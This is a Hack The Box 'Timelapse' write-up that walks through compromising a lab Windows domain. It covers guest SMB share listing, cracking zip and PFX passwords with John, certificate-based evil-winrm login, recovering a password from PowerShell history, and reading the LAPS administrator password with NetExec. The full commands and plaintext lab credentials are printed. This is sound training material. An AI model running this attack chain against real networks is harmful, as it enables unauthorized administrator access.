draft: false
summary: Guest logon enumeration was allowed that lead to a zip and pfx file that was crackable by John, giving user access and then discovering Powershell history commands that lead to mapping DACLs hinting at LAPS being enabled. This also lead to reading the DA password in plaintext

## Enumeration

Guest logon is enabled, let's try enumerate shares

![Description](/static/images/htb/windows/timelapse/1.jpg)

```
❯ smbclient -L timelapse.htb -U a%
```

![Description](/static/images/htb/windows/timelapse/2.jpg)

We can see a non-default share called `Shares`. Listing that reveals a few files

![Description](/static/images/htb/windows/timelapse/3.jpg)

Some of them are an installer and guide and specification on setting up LAPS. This may be
hinting that the target server domain uses LAPS

>[!TIP]
> Local Administrator Password Solution (LAPS) is a tool used for managing a system where
> administrator-passwords, which are unique, randomized and frequently changed are applied
> domain-joined computers

Another interesting file is the zip file called `winrm-backup` which maybe has credentials that
allows us to WinRM to the target. 

Attempting to unzip it will prompt us for a password to unlock a `.pfx` file which is a bianry file that contains a
certificate (public key), private key and a certificate chain

![Description](/static/images/htb/windows/timelapse/4.jpg)

## Cracking

After much enumeration that leads to nowhere, I decided to bruteforce the password of the zip file using `zip2john`

```
❯ zip2john winrm_backup.zip > hash.txt                                 
❯ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

![Description](/static/images/htb/windows/timelapse/5.jpg)

Great now we have the `legacyy_dev_auth.pfx` file. Now the thing with `.pfx` or `pkcs12` files is that they are password-protected unlike `.pem` files

I found this neat tool, pfx2john which is basically what it sounds like xD, means we can also bruteforce the `.pfx` file password

```
❯ pfx2john legacyy_dev_auth.pfx > pfx_hash.txt
❯ john --wordlist=/usr/share/wordlists/rockyou.txt pfx_hash.txt
```

![Description](/static/images/htb/windows/timelapse/6.jpg)

## Gaining Access

Nice, now we also have the password of the `.pfx` file, another thing I also learned is we can use this file
to have an SSL WinRM session on the target! but first, we need to split the `.pfx` file into `.pem` and `.crt`.

```
❯ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes
❯ openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out cert.crt -nodes
```

Then, we supply them as arguments into `evil-winrm` but we need to also specify `-S` argument because we are authenticating over SSL

```
❯ evil-winrm -i timelapse.htb -S -k key.pem -c cert.crt
```

## Privilege Escalation

I uploaded and ran Winpeas and saw some interesting stuff like this Powershell history file being present

![Description](/static/images/htb/windows/timelapse/8.jpg)

Concatenating the file reveals past Powershell commands that were ran on the target. We can see here that
it reveals the password of the user `svc_deploy`. 

![Description](/static/images/htb/windows/timelapse/9.jpg)

Let us verify the credentials

![Description](/static/images/htb/windows/timelapse/10.jpg)

Yep, its correct. Now we can run Bloodhound to map some potential DACLs

```
❯ nxc ldap timelapse.htb -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV' --dns-server 10.129.233.112 --bloodhound --collection All
```

![Description](/static/images/htb/windows/timelapse/12.jpg)

Looking at Bloodhound, we can see `svc_deploy` is a member of the  `Laps_Readers` group that has a `ReadLAPSPassword` Edge.
This means we can use his credentials to read the password of `Administrator`

Luckily, Netexec has a command option that helps us with this

```
❯ nxc smb timelapse.htb -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' --laps
```

![Description](/static/images/htb/windows/timelapse/13.jpg)

Boom! just like that we have `Administrator`'s credentials, let us verify this

![Description](/static/images/htb/windows/timelapse/14.jpg)

Yes, it is correct. We can proceed to WinRM with the SSL option

```
❯ evil-winrm -i timelapse.htb -u administrator -p '@-u{P+{oYZ[C9g%}S1!%XP}m' -S
```

![Description](/static/images/htb/windows/timelapse/15.jpg)

Whas was weird was the root flag was nowhere to be seen. This was a first xD. So i went to look at the Users and saw
mr `TRX` over here

![Description](/static/images/htb/windows/timelapse/16.jpg)

And the root flag was there!
